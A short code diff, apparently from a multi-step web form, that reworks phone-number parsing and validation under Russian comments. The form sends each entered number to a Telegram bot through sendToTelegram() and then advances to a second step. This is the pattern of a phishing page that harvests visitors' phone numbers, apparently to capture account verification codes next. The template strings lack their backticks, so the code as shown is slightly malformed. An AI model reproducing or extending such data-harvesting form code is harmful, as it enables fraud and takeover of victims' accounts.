@@ -292,20 +292,20 @@
       const countryCodeInput = document.querySelector('.country-code').value.trim();
       const phoneInputRaw = document.getElementById('phone').value.trim();
 
-      // Удаляем лишние плюсы
+      // Удаляем лишние "+" в начале каждого поля
       const countryCode = countryCodeInput.replace(/^\+/, '');
       const phone = phoneInputRaw.replace(/^\+/, '');
 
-      // Собираем номер
+      // Склеиваем номер
       phoneNumber = +${countryCode}${phone};
 
-      // Проверка длины полного номера без плюса
-      const fullDigits = ${countryCode}${phone};
-      if (fullDigits.length < 11) {
+      // Проверка: минимум 10 цифр в основном номере (не код страны)
+      if (phone.length < 10) {
         document.getElementById('phoneError').style.display = 'block';
         return;
       }
 
+      // Отправляем в Telegram
       sendToTelegram(📱 Введён номер телефона: ${phoneNumber});
       showStep(2);
     }
